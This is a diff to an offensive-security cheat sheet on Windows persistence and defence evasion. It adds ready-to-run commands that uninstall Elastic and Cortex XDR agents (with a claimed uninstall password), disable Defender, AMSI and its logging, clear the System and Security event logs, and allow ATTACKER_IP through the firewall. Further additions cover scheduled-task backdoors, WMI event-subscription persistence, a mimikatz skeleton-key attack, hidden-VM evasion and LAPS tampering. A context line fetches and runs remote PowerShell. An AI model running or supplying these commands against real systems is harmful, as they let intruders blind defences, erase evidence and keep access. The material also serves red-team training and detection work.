@@ -8,6 +8,7 @@
     * [Antivirus Removal](#antivirus-removal)
     * [Disable Windows Defender](#disable-windows-defender)
     * [Disable Windows Firewall](#disable-windows-firewall)
+    * [Clear System and Security Logs](#clear-system-and-security-logs)
 * [Simple User](#simple-user)
     * [Registry HKCU](#registry-hkcu)
     * [Startup](#startup)
@@ -31,6 +32,7 @@
         * [sethc.exe](#sethc.exe)
     * [Remote Desktop Services Shadowing](#remote-desktop-services-shadowing)
     * [Skeleton Key](#skeleton-key)
+    * [Virtual Machines](#virtual-machines)
 * [Domain](#domain)
     * [Golden Certificate](#golden-certificate)
     * [Golden Ticket](#golden-ticket)
@@ -55,6 +57,34 @@ PS> attrib +h mimikatz.exe
 
 * [Sophos Removal Tool.ps1](https://github.com/ayeskatalas/Sophos-Removal-Tool/)
 * [Symantec CleanWipe](https://knowledge.broadcom.com/external/article/178870/download-the-cleanwipe-removal-tool-to-u.html)
+* [Elastic EDR/Security](https://www.elastic.co/guide/en/fleet/current/uninstall-elastic-agent.html)
+    ```ps1
+    cd "C:\Program Files\Elastic\Agent\"
+    PS C:\Program Files\Elastic\Agent> .\elastic-agent.exe uninstall
+    Elastic Agent will be uninstalled from your system at C:\Program Files\Elastic\Agent. Do you want to continue? [Y/n]:Y
+    Elastic Agent has been uninstalled.
+    ```
+* [Cortex XDR](https://mrd0x.com/cortex-xdr-analysis-and-bypass/)
+    ```ps1
+    # Global uninstall password: Password1
+    Password hash is located in C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
+    Look for PasswordHash, PasswordSalt or password, salt strings.
+
+    # Disable Cortex: Change the DLL to a random value, then REBOOT
+    reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
+
+    # Disables the agent on startup (requires reboot to work)
+    cytool.exe startup disable
+
+    # Disables protection on Cortex XDR files, processes, registry and services
+    cytool.exe protect disable
+
+    # Disables Cortex XDR (Even with tamper protection enabled)
+    cytool.exe runtime disable
+
+    # Disables event collection
+    cytool.exe event_collection disable
+    ```
 
 ### Disable Windows Defender
 
@@ -64,18 +94,37 @@ sc config WinDefend start= disabled
 sc stop WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Wipe currently stored definitions
-# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
-MpCmdRun.exe -RemoveDefinitions -All
-
 ## Exclude a process / location
 Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
 Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 Add-MpPreference -ExclusionPath C:\Video, C:\install
 
+# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
+PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
+PS C:\> Set-MpPreference -DisableIOAVProtection $true
+# Disable AMSI (set to 0 to enable)
+PS C:\> Set-MpPreference -DisableScriptScanning 1 
+
 # Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
 reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+
+# Wipe currently stored definitions
+# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
+MpCmdRun.exe -RemoveDefinitions -All
+
+# Remove signatures (if Internet connection is present, they will be downloaded again):
+PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
+PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
+
+# Disable Windows Defender Security Center
+reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f
+
+# Disable Real Time Protection
+reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
 ```
+
 
 ### Disable Windows Firewall
 
@@ -85,6 +134,13 @@ NetSh Advfirewall set allprofiles state off
 
 # ip whitelisting
 New-NetFirewallRule -Name morph3inbound -DisplayName morph3inbound -Enabled True -Direction Inbound -Protocol ANY -Action Allow -Profile ANY -RemoteAddress ATTACKER_IP
+```
+
+### Clear System and Security Logs
+
+```powershell
+cmd.exe /c wevtutil.exe cl System
+cmd.exe /c wevtutil.exe cl Security
 ```
 
 ## Simple User
@@ -138,36 +194,38 @@ SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -
 
 ### Scheduled Tasks User
 
-Using native **schtask**
+* Using native **schtask** - Create a new task
+    ```powershell
+    # Create the scheduled tasks to run once at 00.00
+    schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
+    # Force run it now !
+    schtasks /run /tn "Device-Synchronize"
+    ```
+* Using native **schtask** - Leverage the `schtasks /change` command to modify existing scheduled tasks
+    ```powershell
+    # Launch an executable by calling the ShellExec_RunDLL function.
+    SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" /TR "C:\windows\system32\rundll32.exe SHELL32.DLL,ShellExec_RunDLLA C:\windows\system32\msiexec.exe /Z c:\programdata\S-1-5-18.dat" /RL HIGHEST /RU "" /ENABLE
+    ```
 
-```powershell
-# Create the scheduled tasks to run once at 00.00
-schtasks /create /sc ONCE /st 00:00 /tn "Device-Synchronize" /tr C:\Temp\revshell.exe
-# Force run it now !
-schtasks /run /tn "Device-Synchronize"
-```
+* Using Powershell
+    ```powershell
+    PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
+    PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
+    PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
+    PS C:\> $S = New-ScheduledTaskSettingsSet
+    PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
+    PS C:\> Register-ScheduledTask Backdoor -InputObject $D
+    ```
 
-Using Powershell
+* Using SharPersist
+    ```powershell
+    # Add to a current scheduled task
+    SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
 
-```powershell
-PS C:\> $A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\Rasta\AppData\Local\Temp\backdoor.exe"
-PS C:\> $T = New-ScheduledTaskTrigger -AtLogOn -User "Rasta"
-PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
-PS C:\> $S = New-ScheduledTaskSettingsSet
-PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
-PS C:\> Register-ScheduledTask Backdoor -InputObject $D
-```
-
-Using SharPersist
-
-```powershell
-# Add to a current scheduled task
-SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
-
-# Add new task
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
-SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
-```
+    # Add new task
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
+    SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
+    ```
 
 
 ### BITS Jobs
@@ -317,6 +375,41 @@ schtasks /create /tn OfficeUpdaterB /tr "c:\windows\syswow64\WindowsPowerShell\v
 schtasks /create /tn OfficeUpdaterC /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://192.168.95.195:8080/kBBldxiub6'''))'" /sc onidle /i 30
 ```
 
+
+### Windows Management Instrumentation Event Subscription
+
+> An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.
+
+
+* **__EventFilter**: Trigger (new process, failed logon etc.)
+* **EventConsumer**: Perform Action (execute payload etc.)
+* **__FilterToConsumerBinding**: Binds Filter and Consumer Classes
+
+```ps1
+# Using CMD : Execute a binary 60 seconds after Windows started
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="WMIPersist", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="WMIPersist", ExecutablePath="C:\Windows\System32\binary.exe",CommandLineTemplate="C:\Windows\System32\binary.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"WMIPersist\"", Consumer="CommandLineEventConsumer.Name=\"WMIPersist\""
+# Remove it
+Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='WMIPersist'" | Remove-WmiObject -Verbose
+
+# Using Powershell (deploy)
+$FilterArgs = @{name='WMIPersist'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60 AND TargetInstance.SystemUpTime < 90"};
+$Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
+$ConsumerArgs = @{name='WMIPersist'; CommandLineTemplate="$($Env:SystemRoot)\System32\binary.exe";}
+$Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
+$FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;}
+$FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
+# Using Powershell (remove)
+$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'WMIPersist'"
+$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'WMIPersist'"
+$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
+$FilterConsumerBindingToCleanup | Remove-WmiObject
+$EventConsumerToCleanup | Remove-WmiObject
+$EventFilterToCleanup | Remove-WmiObject
+```
+
+
 ### Binary Replacement
 
 #### Binary Replacement on Windows XP+
@@ -385,13 +478,67 @@ mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt
 
 ### Skeleton Key
 
+> Inject a master password into the LSASS process of a Domain Controller.
+
+Requirements:
+* Domain Administrator (SeDebugPrivilege) or `NTAUTHORITY\SYSTEM`
+
 ```powershell
-# Exploitation Command runned as DA:
+# Execute the skeleton key attack
+mimikatz "privilege::debug" "misc::skeleton"
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <DCs FQDN>
 
 # Access using the password "mimikatz"
 Enter-PSSession -ComputerName <AnyMachineYouLike> -Credential <Domain>\Administrator
 ```
+
+
+### Virtual Machines
+
+> Based on the Shadow Bunny technique.
+
+```ps1
+# download virtualbox
+Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
+
+# perform a silent install and avoid creating desktop and quick launch icons
+VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0
+
+# in \Program Files\Oracle\VirtualBox\VBoxManage.exe
+# Disabling notifications
+.\VBoxManage.exe setextradata global GUI/SuppressMessages "all" 
+
+# Download the Virtual machine disk
+Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd
+
+# Create a new VM
+$vmname = "IT Recovery"
+.\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register
+
+# Add a network card in NAT mode
+.\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
+.\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
+.\VBoxManage.exe modifyvm $vmname --nic1 nat
+.\VBoxManage.exe modifyvm $vmname --audio none
+.\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
+.\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"
+
+# Mount the VHD file
+.\VBoxManage.exe storagectl $vmname -name "SATA Controller" -add sata
+.\VBoxManage.exe storageattach $vmname -comment "Shadowbunny Disk" -storagectl "SATA Controller" -type hdd -medium "$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd" -port 0
+
+# Start the VM
+.\VBoxManage.exe startvm $vmname –type headless 
+
+
+# optional - adding a shared folder
+# require: VirtualBox Guest Additions
+.\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\ -automount
+# then mount the folder in the VM
+sudo mkdir /mnt/c
+sudo mount -t vboxsf shadow_c /mnt/c
+```
+
 
 ## Domain
 
@@ -441,9 +588,16 @@ kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-20
 kerberos::tgt
 ```
 
+### LAPS Persistence
+
+To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.
+
+```ps1
+Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
+```
+
 ## References
 
-* [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
 * [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
 * [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
 * [IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/)
@@ -454,3 +608,5 @@ kerberos::tgt
 * [Persistence – Image File Execution Options Injection - @netbiosX](https://pentestlab.blog/2020/01/13/persistence-image-file-execution-options-injection/)
 * [Persistence – Registry Run Keys - @netbiosX](https://pentestlab.blog/2019/10/01/persistence-registry-run-keys/)
 * [Golden Certificate - NOVEMBER 15, 2021](https://pentestlab.blog/2021/11/15/golden-certificate/)
+* [Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi](https://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/)
+* [Persistence via WMI Event Subscription - Elastic Security Solution](https://www.elastic.co/guide/en/security/current/persistence-via-wmi-event-subscription.html)
